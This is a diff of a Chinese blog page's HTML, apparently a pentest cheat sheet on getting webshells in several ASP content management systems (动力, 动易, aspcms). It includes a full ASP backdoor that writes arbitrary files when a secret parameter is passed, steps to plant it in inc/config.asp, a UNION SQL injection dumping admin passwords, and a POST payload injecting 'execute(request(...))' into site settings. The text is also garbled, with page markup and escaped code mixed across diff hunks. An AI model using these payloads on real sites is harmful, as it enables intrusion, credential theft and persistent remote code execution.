@@ -9,7 +9,23 @@
   <meta name="description" content="0x00 动力3.5拿shellinurl:printpage.asp?ArticleID=
 1.找到版权信息，把内容替换成：版权所有 Copyright? 2003 动力空间“ ‘版权信息
 if Request(&amp;quot;xiaoxin&amp;quot;)=&amp;quot;520&amp;quot; then
-d">
+dim allen,creat,text,thisline,path
+if Request(&amp;quot;creat&amp;quot;)=&amp;quot;yes&amp;quot; then
+Set fs = CreateObject(&amp;quot;Scripting.FileSystemObject&amp;quot;) 
+Set outfile=fs.CreateTextFile(server.mappath(Request(&amp;quot;path&amp;quot;)))
+outfile.WriteLine Request(&amp;quot;text&amp;quot;)
+Response.write &amp;quot;哈哈&amp;quot;
+end if
+Response.write &amp;quot;&amp;lt;form method=&amp;apos;POST&amp;apos;action=&amp;apos;&amp;quot;&amp;amp;Request.ServerVariables(&amp;quot;URL&amp;quot;)&amp;amp;&amp;quot;?xiaoxin=520&amp;amp;creat=yes&amp;apos;&amp;gt;&amp;quot;
+Response.write &amp;quot;&amp;lt;textarea name=&amp;apos;text&amp;apos;&amp;gt;&amp;quot;&amp;amp;thisline&amp;amp;&amp;quot;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;&amp;quot;
+Response.write &amp;quot;&amp;lt;input type=&amp;apos;text&amp;apos; name=&amp;apos;path&amp;apos; value=&amp;apos;&amp;quot;&amp;amp;Request(&amp;quot;path&amp;quot;)&amp;amp;&amp;quot;&amp;apos;&amp;gt;&amp;quot;
+Response.write &amp;quot;&amp;lt;input name=&amp;apos;submit&amp;apos; type=&amp;apos;submit&amp;apos; value=&amp;apos;ok&amp;apos; &amp;gt;&amp;lt;/form&amp;gt;&amp;quot;
+Response.end
+end if 
+%&amp;gt; 
+2.然后保存，千万别跳转任何页面，直接在IE地址栏内将 admin/Admin_Login.asp 替换成 inc/config.asp?xiaoxin=5203.成功后会进入一个像小马一样的页面，粘贴木马代码以及写上木马文件名即可拿到wshell，木马在inc目录。
+0x01 动易cms拿shell点击网站配置，在网站名称后面插入一句话木马，连接inc/config.asp
+0x02 aspcms">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -88,7 +104,8 @@ end if
 %&gt; 
 </code></pre><p>2.然后保存，千万别跳转任何页面，直接在IE地址栏内将 admin/Admin_Login.asp 替换成 inc/config.asp?xiaoxin=520<br>3.成功后会进入一个像小马一样的页面，粘贴木马代码以及写上木马文件名即可拿到wshell，木马在inc目录。</p>
 <h2 id="0x01-动易cms拿shell"><a href="#0x01-动易cms拿shell" class="headerlink" title="0x01 动易cms拿shell"></a>0x01 动易cms拿shell</h2><p>点击网站配置，在网站名称后面插入一句话木马，连接inc/config.asp</p>
-<h2 id="0x02-aspcms"><a href="#0x02-aspcms" class="headerlink" title="0x02 aspcms"></a>0x02 aspcms</h2><p>简要描述：后台文件AspCms_AboutEdit.asp 未进行验证，且未过滤，导致SQL注入。<br>爆帐号密码：</p>
+<h2 id="0x02-aspcms"><a href="#0x02-aspcms" class="headerlink" title="0x02 aspcms"></a>0x02 aspcms</h2><a id="more"></a>
+<p>简要描述：后台文件AspCms_AboutEdit.asp 未进行验证，且未过滤，导致SQL注入。<br>爆帐号密码：</p>
 <pre><code>admin/_content/_About/AspCms_AboutEdit.asp?id=1 and 1=2 union select 1,2,3,4,5,loginname,7,8,9,password,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 from aspcms_user where userid=1
 </code></pre><p>版本不同需要更改值。<br>第二种方法，找到后台，然后/admin/_system/AspCms_SiteSetting.asp?action=saves<br>直接POST</p>
 <pre><code>[php]runMode=1&amp;siteMode=1&amp;siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC%B6%B9%D8%B1%D5%D6%D0&amp;SwitchComments=1&amp;SwitchCommentsStatus=1&amp;switchFaq=0:Y=request(chr(35)):execute(Y)&amp;SwitchFaqStatus=0&amp;dirtyStr=&amp;waterMark=1&amp;waterMarkFont=hahahaha&amp;waterMarkLocation=1&amp;smtp_usermail=aspcmstest%40163.com&amp;smtp_user=aspcmstest&amp;smtp_password=aspcms.cn&amp;smtp_server=smtp.163.com&amp;MessageAlertsEmail=13322712%40qq.com&amp;messageReminded=1&amp;orderReminded=1&amp;applyReminded=1&amp;commentReminded=1&amp;LanguageID=1[/php]
@@ -262,7 +279,7 @@ $fp = @fopen(&quot;0day.php&quot;, &apos;a&apos;);
 </article>
 
 
-  <h1 class="title">Kommentare</h1>
+  <h1 class="title">Comments</h1>
 
   
       <div id="fb-root"></div>
